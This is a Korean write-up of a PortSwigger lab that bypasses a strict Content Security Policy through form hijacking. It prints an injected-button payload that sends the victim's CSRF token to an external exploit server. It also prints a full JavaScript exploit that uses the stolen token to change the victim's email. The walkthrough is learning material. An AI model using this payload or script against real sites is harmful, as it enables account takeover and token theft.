# 🏴Lab: Reflected XSS protected by very strict CSP, with dangling markup attack (Practitioner 랩이지만 어려웠음)


This lab uses a strict CSP that prevents the browser from loading subresources from external domains.

To solve the lab, perform a form `hijacking attack` that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to `hacker@evil-user.net`.

You must label your vector with the word `"Click"` in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`
You can log in to your own account using the following credentials: `wiener:peter`


### 🔍 분석 및 공격 과정
1. 이번 랩에는 엄격한 CSP 정책이 설정되어 있어 외부 도메인의 자원을 불러오는 것은 막혀있으며, 하이재킹으로 CSP를 우회해서 유저의 CSRF 토큰을 탈취한 후, email을 `hacker@evil-user.net`으로 바꿔야 해결되는 랩이다.
2. 또한, `Click` 과 같은 텍스트를 띄워 유저 상호작용을 유도해야 한다.
3. 일단 wiener로 로그인 한 후 email 변경 페이지를 살펴본다.
   `<input required="" type="email" name="email" value="">`
4. 이메일 입력 태그가 이렇게 생김. 혹시나 쿼리스트링을 수정하여 `">` 삽입이 가능한지 확인 -> 가능했음
5. `?email="><button class="button">click</button>` 다음과 같이 버튼도 만들 수 있었음.
6. 폼 하이재킹을 수행하기 위하여 페이로드 수정. `formaction` 과 `formmethod`를 사용하면 입력 폼의 액션과 메소드를 수정 가능함.
7. `?email="><button class="button" formaction="내 익스플로잇 서버" formmethod="get">click</button>` get메소드로 폼을 내 익스플로잇 서버로 전달한다. 즉 쿼리스트링 형태로 전달한다. form에는 email, csrf가 포함되어 전송된다.
8. 이제 버튼을 클릭하면 내 익스플로잇 서버로 이동하게 된다. 익스플로잇 서버에 도달시 포함된 쿼리스트링의 csrf 토큰을 이용해 email을 `hacker@evil-user.net`으로 변경하도록 메인서버에 요청을 보낸다.
9. 이 작업을 구현하기 위해 랩 좌측 상단에 있는 `go to exploit server`으로 이동한다.
10. `store` 기능을 이용하면 익스플로잇 서버에 적용가능. 스크립트 작성.
```js
<body>
<script>
var attacker_domain = 'https://exploit-0a39007204d631a880e34d87017f00fe.exploit-server.net/exploit';
var lab_domain = 'https://0a0f00d1040c310380c24e0f00720080.web-security-academy.net';
var Url = new URLSearchParams(window.location.search)
var csrf = Url.get('csrf');

if(csrf){
    var f = document.createElement('form');
    var i1 = document.createElement('input');
    var i2 = document.createElement('input');
    
    f.method='POST';
    f.action = `${lab_domain}/my-account/change-email`;

    i1.name = 'email';
    i1.value = 'hacker@evil-user.net';
    f.appendChild(i1);
    
    i2.name = 'csrf';
    i2.value = csrf;
    f.appendChild(i2);
    document.body.appendChild(f);
    
    f.submit();
}else{
    window.location = `${lab_domain}/my-account?email=a@b%22%3E%3Cbutton%20class=%22button%22%20formaction=${attacker_domain}%20formmethod=%22get%22%3Eclick%3C/button%3E` //a@b를 추가한 건 바로 click이라는 버튼을 누를 수 있도록
}

</script>
</body>
```
11. Deliver exploit to victim. -> solve

+ 주의 사항: 이메일 중복이 안돼서, 혹시나 내 이메일이 이미 hacker@evil-user.net으로 변경되어 있는 상태라면 스크립트를 옳게 작성했음에도 해결되지 않을 수 있다.



### 💡 취약점 원리
 엄격한 CSP정책으로 외부 자원의 제한을 걸고 있지만 form 하이재킹에 대한 방어와 email 입력란의 HTML엔티티 인코딩과 민감한 문자들의 이스케이프 처리가 안전하게 되어 있지 않았다.
